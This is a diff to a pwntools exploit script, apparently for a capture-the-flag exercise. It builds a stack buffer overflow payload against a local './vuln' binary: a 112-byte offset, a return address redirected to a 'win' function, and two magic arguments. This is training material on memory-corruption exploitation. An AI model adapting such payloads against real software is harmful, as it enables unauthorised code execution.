@@ -57,16 +57,20 @@ gef> x/100xw $esp
 0xffffcdd4:	0xffffd10f	0xffffd145	0xffffd150	0xffffd160
 """
 
-offset = 112
-winaddr = p32(0x080485cb)
-ebp = winaddr
-
 context.terminal = ["terminator", "-e"]
 
-# we also need to control the "previous ebp" so the arguments are correctly 
-# loaded
-payload = "A"*(offset-4) + ebp + winaddr + "BBBB" + p32(0xDEADBEEF) + p32(0XDEADC0DE)
+# offset computed on:
+# https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+offset = 112
+winaddr = p32(0x080485cb)
+new_eip = winaddr
+prev_esp = "JUNK" # we dont need this but we need to control it / add to payload
+first_arg = p32(0xDEADBEEF)
+second_arg = p32(0XDEADC0DE)
 
+# we also need to control the "previous ebp/esp?" so the arguments are correctly 
+# loaded
+payload = "A"*(offset) + new_eip + prev_esp + first_arg + second_arg
 p = process("./vuln")
 
 # attach(p, gdbscript="""
